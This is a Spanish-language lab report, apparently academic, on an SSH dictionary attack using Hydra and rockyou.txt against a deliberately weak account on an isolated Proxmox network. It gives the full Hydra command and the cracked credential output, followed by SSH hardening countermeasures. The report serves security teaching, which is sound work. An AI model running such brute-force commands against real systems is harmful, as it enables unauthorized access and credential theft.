# Ataque 2: Ataque de Diccionario SSH usando rockyou.txt

## 1. Introducción

En el presente laboratorio se demuestra un ataque de diccionario contra el servicio SSH utilizando la herramienta **Hydra** y el diccionario de contraseñas **rockyou.txt**. El objetivo es evidenciar las vulnerabilidades asociadas al uso de contraseñas débiles en servicios remotos y analizar los riesgos de seguridad que esto representa.

El laboratorio fue realizado en un entorno académico controlado, utilizando máquinas virtuales desplegadas en **Proxmox**, sin afectar sistemas reales o externos.

---

## 2. Objetivos

- Demostrar el funcionamiento de un ataque de fuerza bruta por diccionario contra SSH
- Comprobar la importancia de utilizar contraseñas seguras
- Acceder al sistema víctima una vez obtenidas las credenciales
- Proponer contramedidas para mitigar este tipo de ataques

---

## 3. Entorno de Pruebas

### 3.1 Infraestructura

- **Hipervisor:** Proxmox
- **Red:** Interna (bridge vmbr1)
- **Segmento de red:** 10.10.0.0/24

### 3.2 Máquinas Virtuales

| Rol | Sistema Operativo | Dirección IP | Interfaz | Descripción |
|-----|-------------------|--------------|----------|-------------|
| Atacante | Kali Linux | 10.10.0.101 | vmbr1 | Ejecuta el ataque con Hydra |
| Víctima | Kali Linux | 10.10.0.102 | vmbr1 | Servicio SSH vulnerable |

---

## 4. Configuración de la Máquina Víctima

### 4.1 Activación del servicio SSH

Se verificó que el servicio OpenSSH estuviera activo:
```bash
sudo systemctl status ssh
```

En caso de no estar activo:
```bash
sudo systemctl start ssh
sudo systemctl enable ssh
```

### 4.2 Creación de usuario vulnerable

Se creó un usuario con una contraseña débil incluida en el diccionario rockyou.txt:
```bash
sudo adduser victima
```

**Contraseña asignada:** `password`

> **Nota:** Esta contraseña fue seleccionada intencionalmente por su debilidad para demostrar la vulnerabilidad del sistema y verificado que este en rockyou.txt, en otro caso se puede crear nuestro propio archivo para así ahorrarnos espacio.

### 4.3 Verificación de dirección IP
```bash
ip a
```

**Dirección IP asignada:** `10.10.0.102`

### 4.4 Verificación del servicio SSH
```bash
sudo netstat -tulpn | grep :22
```

Se confirmó que el servicio SSH estaba escuchando en el puerto 22.

---

## 5. Preparación de la Máquina Atacante

### 5.1 Verificación del diccionario rockyou
```bash
ls -lh /usr/share/wordlists/rockyou.txt
```

Si el archivo estaba comprimido:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Características del diccionario:**
- Contiene más de 14 millones de contraseñas comunes
- Tamaño aproximado: 134 MB

### 5.2 Verificación de conectividad

Desde la máquina atacante (10.10.0.101) se verificó la comunicación con la máquina víctima:
```bash
ping -c 4 10.10.0.102
```

**Resultado:** Conectividad exitosa confirmada.

### 5.3 Escaneo de puerto SSH
```bash
nmap -p 22 10.10.0.102
```

Se confirmó que el puerto 22/tcp estaba abierto y ejecutando OpenSSH.

---

## 6. Ejecución del Ataque

Se utilizó **Hydra** para realizar el ataque de diccionario contra el servicio SSH.

### 6.1 Comando utilizado
```bash
hydra -l victima -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.102 -t 4 -V
```

### 6.2 Parámetros del comando

| Parámetro | Descripción |
|-----------|-------------|
| `-l victima` | Especifica el nombre de usuario objetivo |
| `-P /usr/share/wordlists/rockyou.txt` | Ruta al diccionario de contraseñas |
| `ssh://10.10.0.102` | Protocolo y dirección IP del objetivo |
| `-t 4` | Número de tareas paralelas (hilos) |
| `-V` | Modo verbose (muestra cada intento) |

### 6.3 Proceso del ataque

Durante la ejecución, Hydra intentó múltiples combinaciones del diccionario contra el servicio SSH. El proceso fue visible en tiempo real gracias al parámetro `-V`.

---

## 7. Resultados Obtenidos

### 7.1 Credenciales comprometidas

Hydra logró encontrar exitosamente la contraseña del usuario:
```
[22][ssh] host: 10.10.0.102   login: victima   password: password
1 of 1 target successfully completed, 1 valid password found
```

### 7.2 Acceso al sistema

Posteriormente se accedió a la máquina víctima mediante SSH:
```bash
ssh victima@10.10.0.102
```

**Resultado:** Acceso exitoso al sistema comprometido.
```bash
victima@kali:~$ whoami
victima
victima@kali:~$ hostname -I
10.10.0.102
```

Se confirmó así el **compromiso total del sistema**.

---

## 8. Análisis de Riesgos

### 8.1 Impacto del ataque

- **Exposición total del sistema** a accesos no autorizados
- **Posible escalada de privilegios** mediante exploits locales
- **Robo o modificación de información** sensible
- **Persistencia del atacante** en el sistema mediante backdoors
- **Uso del sistema comprometido** como punto de pivote para otros ataques

### 8.2 Factores que facilitaron el ataque

1. Contraseña débil y común
2. Ausencia de mecanismos de protección contra fuerza bruta
3. Autenticación basada únicamente en contraseña
4. Sin limitación de intentos de inicio de sesión

---

## 9. Contramedidas y Recomendaciones

### 9.1 Deshabilitar autenticación por contraseña

Editar el archivo de configuración SSH:
```bash
sudo nano /etc/ssh/sshd_config
```

Modificar las siguientes directivas:
```bash
PasswordAuthentication no
PermitRootLogin no
PubkeyAuthentication yes
```

Reiniciar el servicio:
```bash
sudo systemctl restart ssh
```

### 9.2 Uso de autenticación por llaves SSH

**Generación del par de llaves en el cliente:**
```bash
ssh-keygen -t ed25519 -C "comentario_identificativo"
```

**Copia de la llave pública al servidor:**
```bash
ssh-copy-id victima@10.10.0.102
```

### 9.3 Cambio de puerto predeterminado

Modificar en `/etc/ssh/sshd_config`:
```bash
Port 2222
```

> **Nota:** Esta es una medida de seguridad por oscuridad, NO debe ser la única protección.

### 9.4 Políticas de contraseñas robustas

Implementar requisitos mínimos:
- Longitud mínima de 12 caracteres
- Combinación de mayúsculas, minúsculas, números y símbolos
- Evitar palabras del diccionario
- Cambio periódico de contraseñas

### 9.5 Limitación de intentos de autenticación

Configurar en `/etc/ssh/sshd_config`:
```bash
MaxAuthTries 3
LoginGraceTime 30
```

### 9.6 Monitoreo y auditoría

Revisar regularmente los logs de autenticación:
```bash
sudo tail -f /var/log/auth.log
```

Implementar sistemas de detección de intrusiones (IDS/IPS).

### 9.7 Uso de herramientas de prevención de ataques

Aunque **no se implementó Fail2Ban** en este laboratorio para permitir la demostración completa del ataque, es importante mencionar que herramientas como Fail2Ban son altamente recomendadas en entornos de producción para:

- Bloquear direcciones IP después de varios intentos fallidos
- Registrar actividad sospechosa
- Prevenir ataques de fuerza bruta automatizados

---

## 10. Nota sobre el Alcance del Laboratorio

En este laboratorio **NO se implementó Fail2Ban ni otros mecanismos de protección contra fuerza bruta** durante la fase de ataque, ya que el objetivo principal fue:

1. Demostrar la viabilidad del ataque de diccionario
2. Evidenciar el acceso exitoso al sistema
3. Comprobar la debilidad de contraseñas comunes
4. Permitir que el ataque se complete sin interferencias para fines didácticos

La ausencia de estas medidas de protección fue **intencional y controlada** para propósitos educativos en un entorno aislado.

---

## 11. Conclusiones

1. El uso de **contraseñas débiles** en servicios SSH representa una **grave vulnerabilidad**, fácilmente explotable mediante ataques de diccionario con herramientas automatizadas como Hydra.

2. El ataque fue exitoso en un tiempo relativamente corto, demostrando que las contraseñas comunes no ofrecen protección real contra atacantes determinados.

3. La **autenticación basada únicamente en contraseña** es insuficiente para servicios críticos expuestos a redes.

4. La implementación de **múltiples capas de seguridad** (defensa en profundidad) es fundamental:
   - Autenticación por llaves SSH
   - Contraseñas robustas (cuando sean necesarias)
   - Limitación de intentos de autenticación
   - Cambio del puerto predeterminado
   - Monitoreo continuo de logs
   - Segmentación de red

5. Este tipo de ataques son **prevenibles** mediante la aplicación de buenas prácticas de seguridad y políticas adecuadas de gestión de accesos.

6. El laboratorio cumplió con su objetivo didáctico al demostrar de manera práctica las consecuencias de no implementar medidas de seguridad adecuadas.